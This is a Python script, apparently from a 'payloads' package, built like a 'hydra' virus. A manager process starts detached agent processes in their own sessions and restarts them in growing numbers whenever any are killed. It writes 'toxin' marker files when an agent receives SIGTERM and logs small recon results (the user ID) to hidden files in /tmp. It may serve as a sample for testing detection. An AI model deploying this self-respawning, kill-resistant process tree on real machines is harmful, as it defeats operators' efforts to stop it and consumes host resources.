import os
import sys
import time
import random
import subprocess
import signal

# CONFIG
VIRAL_LOAD = 3  # Initial number of agents
REPLICATION_FACTOR = 2 # How many spawn if one dies
HEARTBEAT_FILE = "/tmp/.flu_heartbeat.json"
RECON_LOG = "/tmp/.flu_symptoms.log"
POISON_DIR = "/tmp/hydra_toxin"

def viral_agent_logic(agent_id):
    """
    The logic code for a single agent.
    """
    # Detach if possible
    try:
        if hasattr(os, 'setsid'):
            os.setsid()
    except: pass

    # Poison on Kill
    def on_kill(signum, frame):
        try:
            with open(POISON_DIR + f"_{agent_id}", "w") as f:
                f.write("TOXIN_RELEASED")
        except: pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, on_kill)

    while True:
        try:
            # 1. Symptom: Minor Recon
            task = random.choice(['user', 'net', 'proc', 'disk'])
            result = ""
            if task == 'user': result = str(os.getuid())
            elif task == 'net': result = "Connected"

            if random.random() < 0.2:
                with open(RECON_LOG, "a") as f:
                    f.write(f"[{agent_id}] {task} -> {result}\n")

            time.sleep(random.uniform(2, 5))
        except: pass

def spawn_agent(agent_id):
    """
    Spawns a new independent process running this script as an agent.
    """
    cmd = [sys.executable, "-c",
           f"from payloads.hydra import viral_agent_logic; viral_agent_logic({agent_id})"]

    # We use Popen to detach
    return subprocess.Popen(cmd, start_new_session=True)

def patient_zero():
    """
    The Manager.
    """
    procs = []

    print(f"[FLU] Patient Zero {os.getpid()} infecting host...")
    for i in range(VIRAL_LOAD):
        procs.append(spawn_agent(random.randint(1000,9999)))

    while True:
        new_procs = []
        for p in procs:
            if p.poll() is None: # Still running
                new_procs.append(p)
            else:
                # Agent died! SPREAD!
                print(f"[FLU] Agent {p.pid} died! Spreading...")
                for _ in range(REPLICATION_FACTOR):
                    new_procs.append(spawn_agent(random.randint(1000,9999)))

        procs = new_procs
        if not procs: # All dead? Respawn
             for i in range(VIRAL_LOAD):
                procs.append(spawn_agent(random.randint(1000,9999)))

        time.sleep(2)

if __name__ == "__main__":
    patient_zero()
